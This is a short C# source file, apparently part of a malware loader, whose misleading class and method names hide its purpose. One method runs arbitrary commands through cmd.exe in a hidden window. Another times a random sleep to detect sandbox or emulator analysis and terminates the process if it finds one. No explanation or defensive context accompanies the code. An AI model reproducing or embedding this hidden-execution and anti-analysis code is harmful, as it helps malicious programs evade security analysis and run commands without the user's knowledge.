﻿using System;
using System.Diagnostics;
using System.Threading;

internal class MaskGenerationMethodDataMisalignedException
{
	internal static void CallConvCdecl(string string_0)
	{
		Process.Start(new ProcessStartInfo("cmd.exe", "/c " + string_0)
		{
			CreateNoWindow = true,
			UseShellExecute = false
		});
	}

	internal static void ReaderWriterLock()
	{
		int num = new Random().Next(3000, 10000);
		int num2 = num;
		DateTime now = DateTime.Now;
		Thread.Sleep(num2);
		if ((DateTime.Now - now).TotalMilliseconds < (double)num2)
		{
			MaskGenerationMethodDataMisalignedException.CallConvCdecl("START CMD /C \"ECHO Emulation detected ! (HResult 0x04) && PAUSE\" ");
			Process.GetCurrentProcess().Kill();
		}
	}

	internal MaskGenerationMethodDataMisalignedException()
	{
	}
}
